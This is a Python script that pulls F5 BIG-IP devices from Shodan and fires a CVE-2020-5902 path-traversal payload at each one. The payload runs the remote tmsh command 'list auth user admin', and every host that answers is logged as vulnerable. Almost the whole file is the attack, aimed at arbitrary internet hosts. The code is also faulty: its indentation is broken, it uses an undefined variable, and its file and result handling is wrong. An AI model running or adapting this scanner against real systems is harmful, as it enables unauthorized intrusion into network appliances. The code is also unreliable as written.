#!/usr/bin/env python
#
# F5.py
# Search SHODAN for F5 BIG IP vulnerable devices
# Checks for:
# CVE-2020-5902
# Author: cbk914

import shodan
#import nmap
import json
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_BIGIP = 'http.title:"BIG-IP&reg;- Redirect"'
SEARCH_FAVICON = 'http.favicon.hash:-335242539'

session = requests.Session()

def checks (IP,PORT,CC):
    print ("[*+]Checking for "+CVE+"\n")
try:
	if PORT == "443":
		http_type = "https"
	else:
		http_type = "http"
    	PAYLOAD = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin" # CVE-2020-5902
    	CVE = "CVE-2020-5902"
	rawBody = "`{""}`"
	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+""+PAYLOAD+"","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
	response = session.post(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"", data=rawBody, headers=headers, verify=False)
	if response.status_code == 200:
			print ("[*]Found F5 device potentially vulnerable to "+CVE+" ... Logging to file.[*]")
			text_file.open("/tmp/f5.log")
        		text_file.write(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"\n")
			text_file.close()
	else:
			print ("[*]F5 BIG IP Not detected[*]")
except Exception as e:
	print('Error: %s' % e)






try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_BIGIP) + api.search(SEARCH_FAVICON)
        
        # Loop through the matches and print each IP
		for service in result['matches']:
			IP = str(service['ip_str'])
			PORT = str(service['port'])
                CC = service['location']['country_name']
		checks (IP,PORT,CC)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
								
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
